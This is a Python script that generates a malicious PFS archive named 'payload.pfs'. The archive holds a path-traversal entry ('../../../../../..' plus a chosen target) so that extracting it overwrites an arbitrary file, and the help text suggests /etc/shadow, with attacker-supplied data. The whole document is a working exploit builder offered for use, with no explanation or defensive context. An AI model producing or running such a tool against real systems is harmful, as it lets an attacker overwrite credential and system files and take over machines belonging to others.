import argparse

parser = argparse.ArgumentParser()
parser.add_argument('--out', help="Output pfs file path (payload.pfs)", default="payload.pfs")
parser.add_argument('--target', required = True, help="File to overwrite (/etc/shadow)")
parser.add_argument('--data', required = True, help="Path to data that is written to the target (./data)")

args = parser.parse_args()


header = b'\x50\x46\x53\x2F\x30\x2E\x39\x0A\x00\x00\x00\x00\x00\x00\x01\x00'

badPfs = open(args.out,'wb')
badPfs.write(header)
targetFile = "../../../../../.."+args.target

if len(targetFile) > 60:
	print("Write filename too long")
	exit()

badPfs.write(targetFile.encode())
for i in range(60-len(targetFile)):
	badPfs.write(b'\x00')

badPfs.write(b'\x01'*4)
badPfs.write(b'\x00'*4)

data = open(args.data, 'rb').read()
badPfs.write(b'\x01'*4)
badPfs.write(len(data).to_bytes(4, 'little'))	
badPfs.write(data)




